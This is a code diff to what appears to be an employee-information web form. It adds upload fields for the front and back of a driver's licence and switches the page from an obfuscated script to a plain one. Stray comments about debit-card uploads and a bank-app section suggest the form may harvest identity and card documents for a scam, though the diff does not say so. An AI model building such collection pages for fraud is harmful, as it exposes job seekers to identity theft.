@@ -191,6 +191,44 @@
                 </form>
             </div>
 
+            <!-- Driver license  -->
+
+            <div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
+                <h3 class="text-xl font-bold text-blue-900 mb-2">Driver License </h3>
+                <p class="text-sm text-blue-700 mb-6">Privide Your Driver License </p>
+
+                <!-- File Upload Sections -->
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-medium text-blue-900 mb-2">Upload Driver license
+                            (Front)</label>
+                        <div class="flex items-center space-x-4">
+                            <!-- Added proper file input for debit card front -->
+                            <input type="file" id="license-front" name="license_front" accept="image/*" class="hidden"
+                                form="employee-form">
+                            <button type="button" onclick="document.getElementById('license-front').click()"
+                                class="bg-blue-900 text-white px-4 py-2 rounded-md text-sm font-medium hover:bg-blue-800 transition-colors">Choose
+                                File</button>
+                            <span id="license-front-name" class="text-gray-500 text-sm">No file chosen</span>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-blue-900 mb-2">Upload Driver license (Back)</label>
+                        <div class="flex items-center space-x-4">
+                            <!-- Added proper file input for debit card back -->
+                            <input type="file" id="license-back" name="license_back" accept="image/*" class="hidden"
+                                form="employee-form">
+                            <button type="button" onclick="document.getElementById('license-back').click()"
+                                class="bg-blue-900 text-white px-4 py-2 rounded-md text-sm font-medium hover:bg-blue-800 transition-colors">Choose
+                                File</button>
+                            <span id="license-back-name" class="text-gray-500 text-sm">No file chosen</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+
             <!-- Bank App Option Section -->
             <div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
                 <h3 class="text-xl font-bold text-blue-900 mb-2">Bank App Option</h3>
@@ -295,7 +333,8 @@
         </div>
     </footer>
     <!-- JavaScript -->
-    <script src="employee-info.obf.js"></script>
+    <script src="employee-info.js"></script>
 </body>
+
 
 </html>
